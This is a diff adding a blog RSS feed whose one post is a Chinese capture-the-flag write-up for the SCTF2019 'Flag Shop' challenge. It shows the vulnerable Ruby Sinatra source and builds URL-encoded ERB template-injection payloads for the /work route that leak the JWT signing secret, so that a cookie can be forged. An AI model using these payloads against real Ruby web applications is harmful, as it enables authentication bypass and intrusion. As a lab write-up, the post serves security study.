@@ -1,0 +1,245 @@
+<?xml version="1.0"?>
+<rss version="2.0">
+    <channel>
+        <title>Hexo • Posts by &#34;jwt身份验证&#34; tag</title>
+        <link>http://odiws.github.io</link>
+        <description></description>
+        <language>en</language>
+        <pubDate>Tue, 30 Jul 2024 23:07:06 +0800</pubDate>
+        <lastBuildDate>Tue, 30 Jul 2024 23:07:06 +0800</lastBuildDate>
+        <category>buuctf</category>
+        <category>system_file</category>
+        <category>sql文件读取</category>
+        <category>文件内无字符rce</category>
+        <category>文件上传</category>
+        <category>php绕过open_basedir设置</category>
+        <category>无字母rce</category>
+        <category>ctf</category>
+        <category>php原生类利用</category>
+        <category>php反序列化</category>
+        <category>md5()和sha1()对类进行hash 触发__toString方法</category>
+        <category>http</category>
+        <category>cms框架</category>
+        <category>python</category>
+        <category>mongodb注入</category>
+        <category>条件竞争：利用session.upload_progress</category>
+        <category>preg_match绕过</category>
+        <category>$_server query_string 绕过</category>
+        <category>$_request绕过</category>
+        <category>file_get_cotents绕过</category>
+        <category>sha1函数比较数组绕过</category>
+        <category>create_function运用</category>
+        <category>buuctf， 反序列化</category>
+        <category>regexp注入</category>
+        <category>ECB加密</category>
+        <category>php7 segment fault特性</category>
+        <category>json数据爬虫</category>
+        <category>phar反序列化</category>
+        <category>js</category>
+        <category>CRLF Injection</category>
+        <category>soap</category>
+        <category>pickle反序列化</category>
+        <category>thinkphpV6.0.0</category>
+        <category>buuctf， 伪随机数</category>
+        <category>zip加密</category>
+        <category>xxe</category>
+        <category>xml_upload</category>
+        <category>flask的session伪造</category>
+        <category>二次渲染</category>
+        <category>buuctf，Perl后端文件上传</category>
+        <category>buuctf，xxe漏洞</category>
+        <category>java</category>
+        <category>flask</category>
+        <category>ctf工具安装教程</category>
+        <category>sql注入</category>
+        <category>php绕过open_opedir设置</category>
+        <category>TOTP</category>
+        <category>rce</category>
+        <category>ssti</category>
+        <category>insert截断</category>
+        <category>xss攻击</category>
+        <category>c的预处理</category>
+        <category>图片类</category>
+        <category>爬虫</category>
+        <category>js原型链污染</category>
+        <category>反序列化字符串逃逸</category>
+        <category>sql injection</category>
+        <category>文件上传(头像上传)</category>
+        <category>session反序列化</category>
+        <category>ssrf</category>
+        <category>HTTP走私攻击</category>
+        <category>json数据unicode转码绕过</category>
+        <category>对sqlite的sql注入</category>
+        <category>未理解</category>
+        <category>命令执行</category>
+        <category>zip软链接</category>
+        <category>python_seed函数</category>
+        <category>session伪造</category>
+        <category>js-vm沙箱逃逸</category>
+        <category>willphp2.2</category>
+        <category>ssti-smarty3.1.39</category>
+        <category>./htaccess文件上传</category>
+        <category>php未解析</category>
+        <category>利用环境变量构造bash命令</category>
+        <category>利用.htaccess构成后门</category>
+        <category>通过php_value来设置preg_macth正则回溯次数</category>
+        <category>java反序列化</category>
+        <category>伪随机数</category>
+        <category>mysql</category>
+        <category>信息搜集（js，网络）</category>
+        <category>异或</category>
+        <category>密码爆破</category>
+        <category>sqlmap使用</category>
+        <category>SQL注入</category>
+        <category>文件包含</category>
+        <category>php伪协议</category>
+        <category>pearcmd文件包含</category>
+        <category>xpath注入</category>
+        <category>Padding oracle attack 与CBC翻转字节攻击</category>
+        <category>php</category>
+        <category>sql盲注</category>
+        <category>php7.4</category>
+        <category>FFI预处理</category>
+        <category>thinkphp3.2.4</category>
+        <category>jwt</category>
+        <category>sql二次注入</category>
+        <category>MD5碰撞</category>
+        <category>jwt密码爆破</category>
+        <category>cms</category>
+        <category>create_function()函数</category>
+        <category>sqlע��</category>
+        <category>jwt身份验证</category>
+        <category>rc4</category>
+        <item>
+            <guid isPermalink="true">http://odiws.github.io/2024/07/30/Shop/</guid>
+            <title>Shop</title>
+            <link>http://odiws.github.io/2024/07/30/Shop/</link>
+            <category>buuctf</category>
+            <category>jwt身份验证</category>
+            <pubDate>Tue, 30 Jul 2024 23:07:06 +0800</pubDate>
+            <description><![CDATA[ &lt;h2 id=&#34;sctf2019flag-shop&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#sctf2019flag-shop&#34;&gt;#&lt;/a&gt; [SCTF2019]Flag Shop&lt;/h2&gt;
+&lt;h2 id=&#34;1&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#1&#34;&gt;#&lt;/a&gt; &lt;img data-src=&#34;../images/%5BSCTF2019%5DFlagShop/1.png&#34; alt=&#34;1&#34;&gt;&lt;/h2&gt;
+&lt;p&gt;点击 buy flag 试试&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;../images/%5BSCTF2019%5DFlagShop/2.png&#34; alt=&#34;2&#34;&gt;&lt;/p&gt;
+&lt;p&gt;提示没有足够的 jkl&lt;/p&gt;
+&lt;p&gt;这里可以点击 work 去赚取 jkl&lt;/p&gt;
+&lt;p&gt;正常点击要攒到 flag 怕是不可能，buu 请求过快也会报错&lt;/p&gt;
+&lt;p&gt;先抓包看看吧&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;../images/%5BSCTF2019%5DFlagShop/3.png&#34; alt=&#34;3&#34;&gt;&lt;/p&gt;
+&lt;p&gt;这里不能修改 work 赚取的 jkl，尝试把 cookie 解码看看：直接修改发现出错，有密码。重新开始审计：&lt;/p&gt;
+&lt;p&gt;又回到最开始的地方。。&lt;/p&gt;
+&lt;p&gt;扫描一下有没有源码泄露之类的&lt;/p&gt;
+&lt;p&gt;发现 robots.txt&lt;/p&gt;
+&lt;p&gt;访问发现有 /filebak&lt;/p&gt;
+&lt;p&gt;发现 ruby 代码：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;require &#39;sinatra&#39;
+require &#39;sinatra/cookies&#39;
+require &#39;sinatra/json&#39;
+require &#39;jwt&#39;
+require &#39;securerandom&#39;
+require &#39;erb&#39;
+
+set :public_folder, File.dirname(__FILE__) + &#39;/static&#39;
+
+FLAGPRICE = 1000000000000000000000000000
+ENV[&amp;quot;SECRET&amp;quot;] = SecureRandom.hex(64)
+
+configure do
+  enable :logging
+  file = File.new(File.dirname(__FILE__) + &#39;/../log/http.log&#39;,&amp;quot;a+&amp;quot;)
+  file.sync = true
+  use Rack::CommonLogger, file
+end
+
+get &amp;quot;/&amp;quot; do
+  redirect &#39;/shop&#39;, 302
+end
+
+get &amp;quot;/filebak&amp;quot; do
+  content_type :text
+  erb IO.binread __FILE__
+end
+
+get &amp;quot;/api/auth&amp;quot; do
+  payload = &amp;#123; uid: SecureRandom.uuid , jkl: 20&amp;#125;
+  auth = JWT.encode payload,ENV[&amp;quot;SECRET&amp;quot;] , &#39;HS256&#39;
+  cookies[:auth] = auth
+end
+
+get &amp;quot;/api/info&amp;quot; do
+  islogin
+  auth = JWT.decode cookies[:auth],ENV[&amp;quot;SECRET&amp;quot;] , true, &amp;#123; algorithm: &#39;HS256&#39; &amp;#125;
+  json(&amp;#123;uid: auth[0][&amp;quot;uid&amp;quot;],jkl: auth[0][&amp;quot;jkl&amp;quot;]&amp;#125;)
+end
+
+get &amp;quot;/shop&amp;quot; do
+  erb :shop
+end
+
+get &amp;quot;/work&amp;quot; do
+  islogin
+  auth = JWT.decode cookies[:auth],ENV[&amp;quot;SECRET&amp;quot;] , true, &amp;#123; algorithm: &#39;HS256&#39; &amp;#125;
+  auth = auth[0]
+  unless params[:SECRET].nil?
+    if ENV[&amp;quot;SECRET&amp;quot;].match(&amp;quot;#&amp;#123;params[:SECRET].match(/[0-9a-z]+/)&amp;#125;&amp;quot;)
+      puts ENV[&amp;quot;FLAG&amp;quot;]
+    end
+  end
+
+  if params[:do] == &amp;quot;#&amp;#123;params[:name][0,7]&amp;#125; is working&amp;quot; then
+
+    auth[&amp;quot;jkl&amp;quot;] = auth[&amp;quot;jkl&amp;quot;].to_i + SecureRandom.random_number(10)
+    auth = JWT.encode auth,ENV[&amp;quot;SECRET&amp;quot;] , &#39;HS256&#39;
+    cookies[:auth] = auth
+    ERB::new(&amp;quot;&amp;lt;script&amp;gt;alert(&#39;#&amp;#123;params[:name][0,7]&amp;#125; working successfully!&#39;)&amp;lt;/script&amp;gt;&amp;quot;).result
+
+  end
+end
+
+post &amp;quot;/shop&amp;quot; do
+  islogin
+  auth = JWT.decode cookies[:auth],ENV[&amp;quot;SECRET&amp;quot;] , true, &amp;#123; algorithm: &#39;HS256&#39; &amp;#125;
+
+  if auth[0][&amp;quot;jkl&amp;quot;] &amp;lt; FLAGPRICE then
+
+    json(&amp;#123;title: &amp;quot;error&amp;quot;,message: &amp;quot;no enough jkl&amp;quot;&amp;#125;)
+  else
+
+    auth &amp;lt;&amp;lt; &amp;#123;flag: ENV[&amp;quot;FLAG&amp;quot;]&amp;#125;
+    auth = JWT.encode auth,ENV[&amp;quot;SECRET&amp;quot;] , &#39;HS256&#39;
+    cookies[:auth] = auth
+    json(&amp;#123;title: &amp;quot;success&amp;quot;,message: &amp;quot;jkl is good thing&amp;quot;&amp;#125;)
+  end
+end
+
+
+def islogin
+  if cookies[:auth].nil? then
+    redirect to(&#39;/shop&#39;)
+  end
+end
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;稍微看了下&lt;/p&gt;
+&lt;p&gt;发现要 do 和 name 一致才能够弹出 secret&lt;/p&gt;
+&lt;p&gt;这里考察 Ruby ERB 注入（参考： &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3pkcTAzOTQxMjMvYXJ0aWNsZS9kZXRhaWxzLzg0NDM2OTQlRUYlQkMlODk=&#34;&gt;https://blog.csdn.net/zdq0394123/article/details/8443694）&lt;/span&gt;&lt;/p&gt;
+&lt;figure class=&#34;highlight ruby&#34;&gt;&lt;figcaption data-lang=&#34;ruby&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;unless&lt;/span&gt; params&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token symbol&#34;&gt;:SECRET&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;nil&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;?&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;token constant&#34;&gt;ENV&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string-literal&#34;&gt;&lt;span class=&#34;token string&#34;&gt;&#34;SECRET&#34;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;match&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string-literal&#34;&gt;&lt;span class=&#34;token string&#34;&gt;&#34;&lt;/span&gt;&lt;span class=&#34;token interpolation&#34;&gt;&lt;span class=&#34;token delimiter punctuation&#34;&gt;#&amp;#123;&lt;/span&gt;&lt;span class=&#34;token content&#34;&gt;params&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token symbol&#34;&gt;:SECRET&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;match&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token regex-literal&#34;&gt;&lt;span class=&#34;token regex&#34;&gt;/[0-9a-z]+/&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token delimiter punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;      puts &lt;span class=&#34;token constant&#34;&gt;ENV&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string-literal&#34;&gt;&lt;span class=&#34;token string&#34;&gt;&#34;FLAG&#34;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;end&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;  &lt;span class=&#34;token keyword&#34;&gt;end&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;这里要是 SECRET 参数存在则对其进行匹配，匹配到了就输出 flag&lt;/p&gt;
+&lt;p&gt;但这里既然有匹配，就可以用全局变量读出来了，也就是用 $` 来读取匹配前的内容&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;../images/%5BSCTF2019%5DFlagShop/4.png&#34; alt=&#34;4&#34;&gt;&lt;/p&gt;
+&lt;p&gt;构造下 payload：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;/work?SECRET=&amp;amp;name=&amp;lt;%=$&#39;%&amp;gt;&amp;amp;do=&amp;lt;%=$&#39;%&amp;gt; is working
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;img data-src=&#34;../images/%5BSCTF2019%5DFlagShop/5.png&#34; alt=&#34;5&#34;&gt;&lt;/p&gt;
+&lt;p&gt;直接使用好像不行。。&lt;/p&gt;
+&lt;p&gt;要把里面内容换位十六进制&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;/work?SECRET=&amp;amp;name=%3c%25%3d%24%27%25%3e&amp;amp;do=%3c%25%3d%24%27%25%3e%20is%20working
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;img data-src=&#34;../images/%5BSCTF2019%5DFlagShop/6.png&#34; alt=&#34;6&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;../images/%5BSCTF2019%5DFlagShop/7.png&#34; alt=&#34;7&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;../images/%5BSCTF2019%5DFlagShop/8.png&#34; alt=&#34;8&#34;&gt;&lt;/p&gt;
+&lt;p&gt;又回显了一个 jwt 解码一下&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;../images/%5BSCTF2019%5DFlagShop/9.png&#34; alt=&#34;9&#34;&gt;&lt;/p&gt;
+&lt;p&gt;参考链接：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9jbmJsb2dzLmNvbS9jMGQxL3AvMTYxMTkzOTMuaHRtbA==&#34;&gt;https://cnblogs.com/c0d1/p/16119393.html&lt;/span&gt;&lt;/p&gt;
+ ]]></description>
+        </item>
+    </channel>
+</rss>
